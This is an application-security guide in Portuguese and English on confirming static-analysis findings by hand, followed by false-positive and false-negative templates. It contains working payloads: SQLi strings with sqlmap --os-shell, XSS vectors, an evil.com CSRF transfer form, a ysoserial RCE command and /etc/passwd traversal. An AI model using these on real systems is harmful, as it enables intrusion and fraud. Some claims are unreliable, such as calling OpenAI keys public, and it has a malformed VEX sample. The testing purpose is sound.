---
id: validacao-manual-findings
title: Validação Manual e Empírica de Findings
description: Taxonomia de 6 categorias de vulnerabilidades com testes empíricos, gestão de falsos positivos/negativos
tags: [findings, validação empírica, i2, invariantes, testes, falsos-positivos]
---

# ✅ Validação Manual e Empírica de Findings

## 🌟 Objetivo

Implementar o Invariante **I2 (Evidência acima de plausibilidade)** de [agent.md](https://github.com/your-org/agent-spec) no contexto de validação empírica de findings de ferramentas SAST/DAST.

Ferramentas automatizadas (Semgrep, SonarQube, Snyk Code) produzem **falsos positivos** (alertam quando não há risco) e **falsos negativos** (não alertam quando há risco real). A validação empírica confirma exploitabilidade e reduz ruído operacional.

---

## 📋 Contexto normativo

**Problema:**
- **Falso Positivo (FP):** SAST reporta "SQL Injection", mas query já usa PreparedStatement (FP)
  - Risk: Team gasta tempo fixando não-issues, perde confiança em ferramentas
- **Falso Negativo (FN):** SAST não reporta XSS, mas output encoding é insuficiente (FN)
  - Risk: Vulnerabilidade permanece, pentesting depois identifica (reputação damage)

**Solução:**
Framework de validação empírica com:
- **Taxonomia:** 6 categorias de vulnerabilidades (SQLi, XSS, CSRF, Hardcoded Secrets, Insecure Deserialization, Path Traversal)
- **Testes:** Exploit PoC para cada categoria
- **FP Management:** Suppression com justificativa técnica + VEX document
- **FN Detection:** RCA + custom rules + regression tests
- **Quality Metrics:** FP <25%, FN <5%, time-to-validation <48h CRITICAL

---

## 🧪 Taxonomia: 6 Categorias de Vulnerabilidades

### 1️⃣ SQL Injection (SQLi)

**SAST Finding Example:**
```
Tool: Semgrep / SonarQube
Type: SQL Injection
Severity: HIGH
Location: src/main/java/UserController.java:42
Code: String query = "SELECT * FROM users WHERE id = " + userId;
```

**Empirical Validation Checklist:**

:::userstory
**História.**  
Como **AppSec Engineer**, quero **validar empiricamente se um SQLi finding é exploitável**, para confirmar risco real antes de exigir fix.

**Critérios de aceitação (BDD).**
- **Dado** que SAST reportou SQLi em endpoint `/api/users/{id}`
  **Quando** tenho executável application (testável local ou staging)
  **Então** realizo teste empírico com SQLi payload e documento resultado

**Procedimento T1: Validação de SQLi**

1. **Identificar vector de ataque:**
   - [ ] Is parameter user-supplied? (HTTP request, API input, file upload, etc.)
   - [ ] Is parameter used in SQL query? (concat, interpolation, or safe: prepared statement?)
   - [ ] Can attacker control the SQL syntax? (or only the value?)
   
   **Example vectors:**
   ```
   VULNERABLE: query = "SELECT * FROM users WHERE id = " + userId
   SAFE: PreparedStatement.setInt(1, userId)
   SAFE: "SELECT * FROM users WHERE id = ?", bindValue=userId
   ```

2. **Craft SQLi payload:**
   - [ ] Standard SQLi: `1' OR '1'='1`
   - [ ] Comment-based: `1'; --`
   - [ ] Union-based: `1' UNION SELECT * FROM passwords --`
   - [ ] Time-based (if output not visible): `1' AND SLEEP(10) --`
   
3. **Execute test:**
   - [ ] Start application locally or in staging
   - [ ] Inject payload via parameter
   - [ ] Observe response:
     - **VULNERABLE:** Returns all rows, or executes comment, or sleep delay observed
     - **SAFE:** Error message, query blocked, or no data exfiltration

   **Example - cURL test:**
   ```bash
   # Vulnerable endpoint
   curl "http://localhost:8080/api/users?id=1' OR '1'='1"
   # Expected VULNERABLE response: List of all users
   # Expected SAFE response: Error or empty list
   
   # Time-based detection (if direct output blocked by WAF)
   time curl "http://localhost:8080/api/users?id=1' AND SLEEP(5) --"
   # Expected VULNERABLE: Response time > 5 seconds
   # Expected SAFE: Response time < 1 second
   ```

4. **Automated tool: sqlmap**
   - [ ] Install: `pip install sqlmap`
   - [ ] Run: `sqlmap -u "http://localhost:8080/api/users?id=1" --batch --risk=3 --dbs`
   - [ ] Output: Database names, tables, data extracted (if VULNERABLE)
   
   ```bash
   sqlmap -u "http://localhost:8080/api/users?id=1" \
     --batch \
     --risk=3 \
     --technique=BEUSTQ \  # All techniques (Boolean, Error, Union, Stacked, Time-based, Inline)
     --os-shell             # Attempt OS command shell
   ```

5. **Document result:**

   **If VULNERABLE:**
   - Severity: CONFIRMED
   - Exploit PoC: `curl "...id=1' OR '1'='1"` returns all users
   - Data exposure: User emails, phone numbers, addresses extracted
   - Decision: Fix REQUIRED (CRITICAL)
   - Escalation: IMMEDIATE (24h fix required)

   **If SAFE (FP detected):**
   - Reason: Application uses PreparedStatement
   - Evidence: Code review shows parameterization
   - Decision: Suppress with VEX (see FP management section)
   - FP log entry: `falsos-positivos/FP-2026-01-16-SQLi-UserController.md`

:::

**Common FP Scenarios:**
- PreparedStatement used (SAST detects string concat but parameterization protects)
- Input already validated upstream (regex, type checking, whitelist)
- Parameter is not in SQL (e.g., used in HTML output, log, but not query)
- Database user is read-only (can't execute dangerous statements)

**Common FN Scenarios:**
- Dynamic SQL in stored procedure (SAST may not detect)
- ORM query builder not recognized by SAST (e.g., custom framework)
- Second-order SQLi (data stored in database, then queried insecurely)
- NoSQL injection instead of SQL (SAST may miss)

---

### 2️⃣ Cross-Site Scripting (XSS)

**SAST Finding Example:**
```
Tool: Semgrep / SonarQube
Type: Reflected XSS
Severity: MEDIUM
Location: src/main/java/SearchController.java:58
Code: response.write("<h1>Results for: " + userQuery + "</h1>");
```

**Empirical Validation Checklist:**

:::userstory
**História.**  
Como **AppSec Engineer**, quero **validar empiricamente se um XSS finding é exploitável**, para confirmar se output é realmente não-escapado.

**Procedimento T2: Validação de XSS**

1. **Identify vector:**
   - [ ] User input stored or reflected in HTML/JavaScript?
   - [ ] Output encoding applied? (HTML entity encoding, URL encoding, JavaScript encoding?)
   - [ ] Context-aware encoding? (Different rules for HTML body vs. attributes vs. JavaScript)
   
2. **Craft XSS payloads:**
   - [ ] Reflected: `<script>alert('XSS')</script>`
   - [ ] Attribute-based: `"><script>alert('XSS')</script><img src="`
   - [ ] JavaScript context: `'; alert('XSS'); //`
   - [ ] Event handler: `<img src=x onerror=alert('XSS')>`
   - [ ] SVG/XML: `<svg onload=alert('XSS')>`
   
3. **Execute test:**
   - [ ] Start application locally or staging
   - [ ] Inject payload via user input (query parameter, form field, search box)
   - [ ] Check response HTML source:
     - **VULNERABLE:** Payload appears unescaped in HTML (e.g., `<script>` tag present)
     - **SAFE:** Payload is HTML-encoded (e.g., `&lt;script&gt;` or JavaScript string literal)
   - [ ] Check browser behavior:
     - **VULNERABLE:** JavaScript executes (alert box appears, or JS console shows execution)
     - **SAFE:** No JavaScript execution (browser security prevents it)

   **Example - Reflected XSS test:**
   ```bash
   # Craft URL with XSS payload
   curl "http://localhost:8080/search?q=<script>alert('XSS')</script>"
   
   # Check response HTML
   # VULNERABLE: Response HTML contains raw <script> tag
   # SAFE: Response HTML shows &lt;script&gt; (HTML-encoded)
   ```

4. **Browser validation (for visual confirmation):**
   - [ ] Open application in browser
   - [ ] Navigate to: `http://localhost:8080/search?q=<img src=x onerror=alert('XSS')>`
   - [ ] **VULNERABLE:** Alert box appears
   - [ ] **SAFE:** No alert (payload encoded or CSP blocks inline scripts)

5. **Automated tool: Burp Suite Community (XSS Scanner):**
   - [ ] Load Burp Suite
   - [ ] Navigate to vulnerable page with payload
   - [ ] Burp Scanner will test variants and report confirmed XSS

6. **CSP & Defense-in-Depth Check:**
   - [ ] Is Content-Security-Policy header present?
   - [ ] Does CSP block inline scripts? (`script-src 'self'` or `script-src 'nonce-...'`)
   - [ ] If CSP blocks inline scripts, but non-inline XSS possible? (external script injection)
   
   ```bash
   # Check CSP header
   curl -I "http://localhost:8080/search?q=test" | grep -i content-security-policy
   # Expected SAFE: Content-Security-Policy: script-src 'self'; object-src 'none';
   ```

7. **Document result:**

   **If VULNERABLE:**
   - Severity: CONFIRMED
   - Exploit PoC: `<img src=x onerror=alert('XSS')>` executes in browser
   - Impact: Steal session cookies, redirect to phishing, keylogging
   - Decision: Fix REQUIRED
   - Fix approach: HTML-encode output (use templating engine auto-escaping)

   **If SAFE (FP detected):**
   - Reason: Output is HTML-encoded by templating engine
   - Evidence: `<script>` appears as `&lt;script&gt;` in HTML source
   - Decision: Suppress with VEX
   - FP log: `falsos-positivos/FP-2026-01-16-XSS-SearchController.md`

:::

**Common FP Scenarios:**
- Template engine with auto-escaping (Jinja2, ERB, Freemarker)
- CSP header blocks inline scripts (XSS not executable even if unescaped)
- Output is not in HTML context (e.g., in JSON, PDF, plain text)
- Input is URL-encoded before reaching output (double-encoding)

**Common FN Scenarios:**
- DOM-based XSS (JavaScript constructs HTML from URL, not server-side output)
- SAST doesn't understand template engine escaping rules
- Blacklist filtering instead of whitelist (attacker can bypass filters)
- XSS in SVG or XML attributes (non-standard contexts)

---

### 3️⃣ Cross-Site Request Forgery (CSRF)

**SAST Finding Example:**
```
Tool: Semgrep / SonarQube
Type: Cross-Site Request Forgery
Severity: MEDIUM
Location: src/main/java/TransferController.java:75
Code: @PostMapping("/transfer") public void transfer(@RequestParam amount) { ... }
Issue: No CSRF token validation
```

**Empirical Validation Checklist:**

:::userstory
**História.**  
Como **AppSec Engineer**, quero **validar empiricamente se CSRF é exploitável**, confirmando se endpoint aceita state-changing requests de origins diferentes.

**Procedimento T3: Validação de CSRF**

1. **Identify vector:**
   - [ ] Is endpoint state-changing? (POST, PUT, DELETE — not GET, HEAD, OPTIONS)
   - [ ] Does endpoint require CSRF token? (Check for X-CSRF-Token, _csrf parameter)
   - [ ] Is cookie set with SameSite flag? (SameSite=Strict prevents CSRF in browsers)
   
2. **Craft CSRF PoC:**
   - [ ] Create malicious HTML form that submits to target endpoint
   - [ ] Example: Bank transfer endpoint exploitable via CSRF
   
   ```html
   <!-- evil.html - hosted on attacker's domain (evil.com) -->
   <html>
   <body>
   <form action="http://victim-bank.com/api/transfer" method="POST">
     <input type="hidden" name="toAccount" value="attacker-account">
     <input type="hidden" name="amount" value="10000">
   </form>
   <script>
     document.forms[0].submit();  // Auto-submit when victim visits
   </script>
   </body>
   </html>
   ```

3. **Execute test:**
   - [ ] Save PoC as `evil.html`
   - [ ] Host on different domain (or use local HTTP server on different port)
   - [ ] Login to target application (victim.com) in browser (session cookie set)
   - [ ] Visit attacker's `evil.html` in same browser
   - [ ] Check if state-changing action executed (transfer happened):
     - **VULNERABLE:** Transfer executed without victim's knowledge (CSRF token missing/not checked)
     - **SAFE:** Request rejected (CSRF token validation or SameSite cookie prevents it)

   **Example - CSRF PoC test:**
   ```bash
   # Simulate victim session + CSRF request
   # 1. Login and capture session cookie
   curl -c cookies.txt "http://localhost:8080/login" \
     -d "username=user&password=pass"
   
   # 2. Send CSRF request (transfer money) without CSRF token
   curl -b cookies.txt "http://localhost:8080/api/transfer" \
     -d "toAccount=attacker&amount=10000"
   
   # VULNERABLE: Transfer succeeds (balance changed)
   # SAFE: Request rejected (403 Forbidden, or transfer doesn't happen)
   ```

4. **Check CSRF protections:**
   - [ ] CSRF token in HTML form? (`<input type="hidden" name="_csrf" value="...">`)
   - [ ] Custom header required? (`X-CSRF-Token: ...`)
   - [ ] SameSite cookie flag? (Check Set-Cookie header)
   
   ```bash
   # Check SameSite flag
   curl -I "http://localhost:8080/login" | grep -i set-cookie
   # Expected SAFE: Set-Cookie: sessionId=...; SameSite=Strict; HttpOnly; Secure
   # Expected SAFE: Set-Cookie: sessionId=...; SameSite=Lax; HttpOnly; Secure
   ```

5. **Document result:**

   **If VULNERABLE:**
   - Severity: CONFIRMED
   - Exploit PoC: Form submission from evil.com succeeds
   - Impact: Account takeover, unauthorized transactions, malware distribution
   - Decision: Fix REQUIRED
   - Fix approach: Add CSRF token validation + SameSite=Strict

   **If SAFE (FP detected):**
   - Reason: Endpoint validates CSRF token or uses SameSite=Strict
   - Evidence: CSRF token present in form + server-side validation
   - Decision: Suppress with VEX
   - FP log: `falsos-positivos/FP-2026-01-16-CSRF-TransferController.md`

:::

**Common FP Scenarios:**
- API uses CSRF token validation (SAST may not recognize custom header)
- CORS headers correctly configured (cross-origin requests rejected)
- SameSite cookie flag prevents CSRF in modern browsers
- Endpoint requires additional authentication (OTP, re-verification)

**Common FN Scenarios:**
- GET requests used for state-changing (should be POST/PUT/DELETE)
- GET request redirects to POST (redirects may not validate CSRF token)
- CSRF token validation is weak (token not properly checked, or reused)
- Double-submit cookie technique without proper validation

---

### 4️⃣ Hardcoded Secrets (API Keys, Passwords, Tokens)

**SAST Finding Example:**
```
Tool: Semgrep / GitGuardian / Snyk Code
Type: Hardcoded Secret
Severity: CRITICAL
Location: src/main/resources/application.properties:42
Code: AWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE
```

**Empirical Validation Checklist:**

:::userstory
**História.**  
Como **AppSec Engineer**, quero **validar empiricamente se um hardcoded secret é exploitável**, confirmando se secret é real e pode ser usado para comprometer recursos.

**Procedimento T4: Validação de Hardcoded Secrets**

1. **Identify secret type:**
   - [ ] API Key format recognized? (AWS, Azure, GitHub, etc.)
   - [ ] Is in code or config? (Code harder to rotate, config easier)
   - [ ] How many developers have access to source? (If only 2, risk lower; if 500, higher)
   
2. **Classify secret:**
   - [ ] **Production secret?** (Can be used to access prod resources?)
   - [ ] **Test/dev secret?** (Dummy value for testing, not real credentials?)
   - [ ] **Revoked secret?** (Was this already rotated/disabled?)
   
   **Test by attempting to use secret:**
   ```bash
   # Example 1: AWS API key
   export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
   export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
   aws s3 ls
   
   # If list succeeds → Secret is VALID (VULNERABLE)
   # If access denied → Secret is INVALID/REVOKED (lower risk, but still exposed)
   
   # Example 2: GitHub token
   curl -H "Authorization: token ghp_1234567890abcdef" \
     https://api.github.com/user
   
   # If returns user info → Token is VALID (VULNERABLE)
   # If 401 Unauthorized → Token is INVALID/REVOKED
   ```

3. **Assess exploitability:**
   - [ ] Can attacker read secrets from repository? (Public repo? Leaked? Insider threat?)
   - [ ] Can secret be used to compromise critical resources? (Access production databases? Modify infrastructure?)
   - [ ] Blast radius: How many systems affected if this secret is compromised?
   
4. **Document result:**

   **If VULNERABLE (Real, valid secret, prod access):**
   - Severity: CRITICAL
   - Exploit: Any developer can read code, use secret for unauthorized access
   - Impact: Full access to AWS account, S3 buckets, databases, CI/CD pipelines
   - Decision: IMMEDIATE rotation required
   - Action: Rotate secret NOW, revoke old secret, audit usage logs
   - Escalation: CRITICAL (CTO, Security team)

   **If SAFE/LOWER RISK (Test secret, revoked, limited access):**
   - Reason: Secret is dummy value for tests (API_KEY=sk_test_xxx)
   - Evidence: Attempted to use secret → Access denied (revoked/invalid)
   - Decision: Suppress with VEX + rotate immediately (best practice)
   - FP log: `falsos-positivos/FP-2026-01-16-Hardcoded-Secret-Config.md`

:::

**Common FP Scenarios:**
- Test/dummy credentials in example code (sk_test_xxx, not sk_live_xxx)
- Credentials already rotated (secret is revoked, can't be used)
- Public API keys (GitHub Copilot key, OpenAI key, intended for public use)
- Passwords in comments or examples (not actual secrets)

**Common FN Scenarios:**
- Secret obfuscated or encoded (base64, ROT13) — SAST may not detect
- Secret stored in environment variables (harder for SAST to detect)
- Secret in configuration file not checked by SAST (YAML, JSON, XML, properties)
- Multi-part secrets (username + password split across multiple variables)

---

### 5️⃣ Insecure Deserialization

**SAST Finding Example:**
```
Tool: Semgrep / SonarQube
Type: Insecure Deserialization
Severity: HIGH
Location: src/main/java/DataProcessor.java:105
Code: ObjectInputStream ois = new ObjectInputStream(inputStream);
      Object obj = ois.readObject();
```

**Empirical Validation Checklist:**

:::userstory
**História.**  
Como **AppSec Engineer**, quero **validar empiricamente se insecure deserialization permite RCE**, testando gadget chains ou custom payloads.

**Procedimento T5: Validação de Insecure Deserialization**

1. **Identify serialization format:**
   - [ ] Java ObjectInputStream? (Classic serialization, many gadget chains)
   - [ ] Python pickle? (Also allows code execution)
   - [ ] YAML.load()? (Can execute arbitrary code)
   - [ ] XML deserialization? (XXE, entity expansion)
   
2. **Identify data source:**
   - [ ] Is deserialized data from untrusted source? (User upload, network, external service)
   - [ ] Is input validated/signed? (Object signing or integrity check?)
   - [ ] Is whitelist applied? (Deserialize only specific classes?)
   
3. **Craft exploit payload:**
   - [ ] **Java gadget chains:** ysoserial tool generates RCE payloads
   - [ ] **Python pickle:** craft malicious pickle bytecode
   - [ ] **YAML:** use YAML.load() unsafe code execution
   
   ```bash
   # Java gadget chain exploitation
   # 1. Generate payload using ysoserial
   java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwned' | base64
   
   # 2. Send serialized payload to vulnerable endpoint
   curl -X POST "http://localhost:8080/process" \
     -H "Content-Type: application/octet-stream" \
     --data-binary @payload.bin
   
   # 3. Check if command executed
   ls -la /tmp/pwned
   # If file exists → RCE CONFIRMED (VULNERABLE)
   # If file doesn't exist → Deserialization blocked or whitelist applied (SAFE)
   ```

4. **Validate exploitation:**
   - [ ] Does command execute? (touch file, create network connection, reverse shell)
   - [ ] Can attacker achieve RCE? (Execute arbitrary code with application privileges)
   
5. **Document result:**

   **If VULNERABLE:**
   - Severity: CRITICAL
   - Exploit: ysoserial CommonsCollections gadget chain → RCE
   - Impact: Full system compromise, attacker executes code with app privileges
   - Decision: Fix REQUIRED IMMEDIATELY
   - Fix: Remove ObjectInputStream usage, switch to safer serialization (JSON), or add class whitelist + object validation

   **If SAFE (FP detected):**
   - Reason: Application uses serialization filter / whitelist
   - Evidence: ObjectInputStream with ObjectInputFilter restricting classes
   - Decision: Suppress with VEX
   - FP log: `falsos-positivos/FP-2026-01-16-Deserialization-DataProcessor.md`

:::

**Common FP Scenarios:**
- Deserialization input is from trusted source only (internal queue, signed data)
- ObjectInputStream with FilteringObjectInputStream or serialization filter
- Class whitelist applied (only specific classes can be deserialized)
- Gadget chains not available in classpath (Commons Collections not present)

**Common FN Scenarios:**
- Custom serialization framework not recognized by SAST
- Gadget chains via newer libraries (Spring, Hibernate)
- Conditional code path: deserialization only in certain scenarios
- Data validated after deserialization (too late, RCE already possible)

---

### 6️⃣ Path Traversal (Directory Traversal)

**SAST Finding Example:**
```
Tool: Semgrep / SonarQube
Type: Path Traversal
Severity: MEDIUM
Location: src/main/java/FileServlet.java:62
Code: String filename = request.getParameter("file");
      File file = new File("/uploads/" + filename);
      return file.read();
```

**Empirical Validation Checklist:**

:::userstory
**História.**  
Como **AppSec Engineer**, quero **validar empiricamente se path traversal permite leitura de arquivos fora do diretório permitido**.

**Procedimento T6: Validação de Path Traversal**

1. **Identify vector:**
   - [ ] User-controlled filename or path?
   - [ ] Validation applied? (Whitelist, basename extraction, path normalization?)
   - [ ] What files could be accessed? (System files, configs, credentials?)
   
2. **Craft traversal payloads:**
   - [ ] `../../../etc/passwd` (Unix-style traversal)
   - [ ] `..\\..\\..\\windows\\system32\\config\\sam` (Windows-style)
   - [ ] URL encoding: `%2e%2e%2f%2e%2e%2fetc%2fpasswd` (bypass basic filters)
   - [ ] Double encoding: `%252e%252e%252fetc%252fpasswd`
   - [ ] Null byte: `file.txt%00.jpg` (older systems)
   
3. **Execute test:**
   - [ ] Request: `http://localhost:8080/download?file=../../../etc/passwd`
   - [ ] Check if `/etc/passwd` contents are returned:
     - **VULNERABLE:** File contents visible (attacker can read system files)
     - **SAFE:** Error message or empty response (path validation prevents traversal)

   ```bash
   # Path traversal test
   curl "http://localhost:8080/download?file=../../../etc/passwd"
   
   # VULNERABLE: Response shows /etc/passwd contents (root:x:0:0:...)
   # SAFE: Response shows error (File not found) or empty
   
   # Try encoding bypass
   curl "http://localhost:8080/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
   ```

4. **Check filename validation:**
   - [ ] Is filename sanitized? (basename() extraction, regex check)
   - [ ] Is path normalized? (Canonical path comparison)
   - [ ] Whitelist applied? (Only specific files allowed)
   
   ```java
   // VULNERABLE: No validation
   File file = new File("/uploads/" + filename);
   
   // SAFER: basename extraction
   String filename = new File(userInput).getName();  // Removes path traversal
   
   // SAFEST: Whitelist + canonical path
   String allowed = "/uploads";
   File file = new File(allowed, filename).getCanonicalFile();
   if (!file.getCanonicalPath().startsWith(allowed)) throw new Exception("Traversal detected");
   ```

5. **Document result:**

   **If VULNERABLE:**
   - Severity: CONFIRMED
   - Exploit: `../../../etc/passwd` returns system files
   - Impact: Information disclosure (system files, configs, application code)
   - Decision: Fix REQUIRED
   - Fix: Use basename() or canonical path comparison

   **If SAFE (FP detected):**
   - Reason: filename validated with whitelist or basename extraction
   - Evidence: `../../../etc/passwd` returns error or empty
   - Decision: Suppress with VEX
   - FP log: `falsos-positivos/FP-2026-01-16-PathTraversal-FileServlet.md`

:::

**Common FP Scenarios:**
- basename() used to extract just filename (no directory path)
- Whitelist: Only specific files available for download
- Path normalization: Canonical path checked against allowed directory
- Server doesn't have file permissions (even if traversal succeeds, file can't be read)

**Common FN Scenarios:**
- ZIP file extraction with path traversal (zip slip)
- Symlink following (traversal via symlinks, not directory paths)
- Archive extraction with paths (tar, gzip contain directory structure)
- Encoding bypasses (multiple encoding layers not validated)

---

## 📊 FP/FN Management

### Gestão de Falsos Positivos (FP)

**Workflow:**

```
1. SAST Reports Finding
   ↓
2. Developer: Analyze Vulnerability
   - [ ] Is code really vulnerable? (Check code context, validation, controls)
   - [ ] Run Empirical Test from T1-T6 above
   - [ ] Document evidence
   ↓
3. Result: FP or TP (True Positive)?
   
   IF TP → Fix required (see addon-11 Decision Framework)
   
   IF FP → Create Suppression Document & VEX
```

**FP Suppression Template (Template S1):**

```markdown
# Falso Positivo Report

**Finding ID:** SEMGREP-SQL-001 (internal tracking)
**Tool:** Semgrep
**Rule:** java.lang.security.audit.sql-injection
**Date:** 2026-01-16
**Reviewer:** João Silva (Developer), Maria Santos (AppSec)

## Finding Details
- Location: UserController.java:42
- Code: `String query = "SELECT * FROM users WHERE id = " + userId;`
- Severity: HIGH (reported)

## Analysis

### Why It's a False Positive

**Technical Justification:**
- Code appears to concatenate user input into SQL query
- However, userId parameter is NOT user-supplied in this context
- userId is internal variable, assigned from parameterized database query upstream

**Evidence:**
```java
// Line 35: userId comes from parameterized query (SAFE)
PreparedStatement pst = connection.prepareStatement("SELECT id FROM admin_users WHERE email = ?");
pst.setString(1, email);
int userId = pst.executeQuery().getInt("id");

// Line 42: userId reused in second query (user input NOT involved)
String query = "SELECT * FROM users WHERE id = " + userId;
// userId is INTEGER, not string, cannot be injected
```

### Why Automation Missed Context

Semgrep detects string concatenation in SQL context but doesn't trace:
- Where userId comes from (upstream parameterized query)
- Type of userId (int vs. String)
- Whether user can control userId

### Testing Performed

```bash
# Attempted SQLi payload
curl "http://localhost:8080/api/users?id=1' OR '1'='1"

# Result: API expects numeric ID in path parameter
# SQLi payload rejected by parameter type validation
# userId extracted from parameterized query, not user input
```

## VEX (Vulnerability Exception) Document

**Status:** NOT_AFFECTED (Code is not vulnerable)
**Justification:** Vulnerability condition does not exist in code
**Impact Statement:** userId is derived from parameterized query, user input not involved
**Expiration:** 2026-07-16 (6 months review cycle)

## Suppression

**Code annotation:**
```java
// nosemgrep: java.lang.security.audit.sql-injection
// Reason: userId is INTEGER from parameterized query, not user input
// No SQL injection possible. False positive. VEX: FP-2026-01-16-UserController
String query = "SELECT * FROM users WHERE id = " + userId;
```

**VEX File:** `vex/FP-2026-01-16-UserController.vex.json`
```json
{
  "vexVersion": "1.0",
  "dataLicense": "CC0-1.0",
  "metadata": {
    "timestamp": "2026-01-16T14:00:00Z",
    "tools": [{"component": "Semgrep", "version": "1.65"}}]
  },
  "components": [{
    "bom-ref": "app-2.0.0",
    "name": "MyApp",
    "version": "2.0.0"
  }],
  "vulnerabilities": [{
    "ref": "SEMGREP-SQL-001",
    "state": "not_affected",
    "justification": "no_fix_available",
    "impact": "userId is integer from parameterized query"
  }]
}
```

## Approval

- **Reviewed by:** Maria Santos, AppSec Engineer
- **Approved:** 2026-01-16 15:30 UTC
- **Signed:** maria.santos@company.com
- **Next review:** 2026-07-16

## Lessons Learned

**Recommendation for Semgrep:**
- Configure rule to trace parameter origin (parameterized vs. user-supplied)
- Add context: "userId from int type source" vs. "String from user input"
- Consider raising threshold for similar patterns in secure codebases

**For development team:**
- Add comment explaining data flow (especially when string concat used for non-user input)
- Consider type-safe alternative: `String.format("SELECT * FROM users WHERE id = %d", userId);`
```

### Gestão de Falsos Negativos (FN)

**Workflow:**

```
1. Vulnerability Discovered (Pentest, incident, etc.)
   ↓
2. Check: Did SAST tools detect this?
   
   IF YES (TP detected) → Nothing to do, great!
   
   IF NO → False Negative found
   ↓
3. Root Cause Analysis (RCA)
   - Why did SAST miss this?
   - Pattern not recognized?
   - Tool limitation?
   - Configuration issue?
   ↓
4. Mitigate & Improve
   - Create custom rule for SAST
   - Add to regression test suite
   - Update training
```

**FN Root Cause Analysis Template (Template S2):**

```markdown
# Falso Negativo Report

**Finding ID:** FN-2026-01-16-001
**Vulnerability Type:** Reflected XSS
**Discovery Method:** Pentesting (2026-01-16)
**Date:** 2026-01-16

## Vulnerability Details

**Location:** SearchController.java:58
**Severity:** MEDIUM
**Type:** Reflected XSS in search parameter

**Vulnerable Code:**
```javascript
// Frontend (React component)
const searchResults = this.props.location.search.substring(1);  // Get URL params
return <div dangerouslySetInnerHTML={{__html: searchResults}} />;  // Unsafe!
```

**Exploit PoC:**
```
http://app.com/search?q=<img src=x onerror=alert('XSS')>
JavaScript executes in attacker's context
```

## Root Cause Analysis

### Why SAST Missed This

**Tool:** SonarQube (JavaScript plugin)
**Version:** 8.9.3
**Configuration:** Default rules

**Analysis:**
1. **Frontend code is JavaScript/React** — SonarQube JS plugin may not analyze React JSX properly
2. **`dangerouslySetInnerHTML` is intentionally unsafe** — SonarQube rule for this exists, but:
   - Rule: "Do not use `dangerouslySetInnerHTML` with user input"
   - Status: Not enabled in default configuration
3. **Configuration issue:** Rule must be explicitly enabled

**Why it happens:**
- `dangerouslySetInnerHTML` is documented as dangerous, so rule is "experimental"
- Team disabled rule because of high false positive rate on legitimate use cases
- Legitimate case: Markdown content, rich text editors (legitimate unsafe handling)
- False negatives: When XSS input reaches dangerouslySetInnerHTML

### Verification

- [ ] Tool versions: SonarQube 8.9.3 JS plugin, latest (9.2.0) has improved detection
- [ ] Configuration: Rule "S5254" (dangerouslySetInnerHTML) disabled in our quality gate
- [ ] Pattern: Frontend URL param parsing not tracked by static analysis

## Mitigation

### Immediate (Fix the vulnerability)
- [ ] PR #890: Remove `dangerouslySetInnerHTML`, use React text interpolation
- [ ] Test with XSS payload: Confirms payload is encoded
- [ ] Merge & deploy to production

### Improve SAST Detection
- [ ] Enable SonarQube rule S5254 (dangerouslySetInnerHTML)
- [ ] Update SonarQube to 9.2.0+ (improved React detection)
- [ ] Configure rule: Allow legitimate cases (whitelist rich text editors)

### Add Regression Test
- [ ] Jest test: `test('XSS payload in search parameter should be encoded')`
- [ ] Add to CI/CD: Fails if dangerouslySetInnerHTML with user input detected

### Update Training
- [ ] Team training: "Dangers of dangerouslySetInnerHTML"
- [ ] Code review checklist: "XSS protection in React components"
- [ ] SAST configuration review: Quarterly audit of disabled rules

## Approval & Tracking

- **RCA Completed by:** Maria Santos (AppSec)
- **Date:** 2026-01-16
- **Action Items:**
  - [ ] Deploy fix (PR #890) — Assigned: João Silva — Due: 2026-01-17
  - [ ] Enable SonarQube rule S5254 — Assigned: DevOps team — Due: 2026-01-18
  - [ ] Update to SonarQube 9.2.0 — Assigned: Infrastructure — Due: 2026-01-20
  - [ ] Add regression test — Assigned: QA team — Due: 2026-01-18
  - [ ] Team training — Assigned: Maria Santos — Due: 2026-01-23
  
## Lessons Learned

**What we learned:**
1. Configuration matters: Disabled rules can hide vulnerabilities
2. Frontend/backend different risks: Frontend tooling less mature than backend
3. False positives cause rule fatigue: Need better configuration, not less detection

**Prevention:**
- Quarterly SAST rule audit (which rules disabled? why?)
- Frontend testing different from backend (browser testing, CSP validation, etc.)
- Manual code review: Critical XSS-prone patterns (dangerouslySetInnerHTML, innerHTML, eval)
```

---

## 🎯 Quality Metrics & Thresholds

**Metric 1: False Positive Rate**
- **Definition:** % of reported findings that are false positives (not exploitable)
- **Calculation:** (FPs approved / Total findings) × 100
- **Target by tool:**
  - SAST (Semgrep): <15% (high precision, few FPs)
  - SAST (SonarQube): <20% (medium precision)
  - DAST (Burp): <10% (best precision)
  - Dep scanning (Snyk): <25% (lower precision, many policy-based findings)
- **Action:**
  - If >30%: Tool configuration inadequate, adjust rule set
  - If >40%: Tool replacement recommended

**Metric 2: False Negative Rate**
- **Definition:** % of real vulnerabilities not detected by SAST
- **Calculation:** (FNs discovered in pentest/incidents / Total real vulns) × 100
- **Target:** <5%
- **Action:**
  - If >10%: SAST coverage insufficient, add manual testing
  - If >15%: Tool replacement + supplementary scanning needed

**Metric 3: Time-to-Validation**
- **Definition:** Days from finding reported to validation complete (FP/TP confirmed)
- **Target:** <48 hours for CRITICAL, <5 days for HIGH, <10 days for MEDIUM
- **Calculation:** Median validation time across all findings
- **Action:**
  - If >SLA: Review bottlenecks (Developer availability? AppSec capacity?)

**Metric 4: Suppression Rate & Justification**
- **Definition:** % of findings suppressed (REJEITAR) vs. fixed
- **Target:** 10-20% healthy ratio
- **Flags:**
  - If <5%: Team may over-accept findings, many FPs being fixed
  - If >30%: Too many suppressions, possible risk acceptance without justification

**Metric 5: Proporcionalidade by Risk Level**

| Level | FP Rate Target | FN Rate Target | Time-to-Validation | Empirical Test Required |
|---|---|---|---|---|
| L1 | <20% | <10% | <10 days | Optional (CRITICAL only) |
| L2 | <15% | <5% | <5 days | MEDIUM+ (HIGH/CRITICAL mandatory) |
| L3 | <10% | <3% | <48 hours | ALL findings (multi-method) |

---

## 🔗 Integração com Invariantes de agent.md

**I2 — Evidência acima de plausibilidade:**  
✅ Framework implementado (Taxonomia T1-T6, empirical tests, FP/FN management)

**I1 — Separação sugestão/decisão:**  
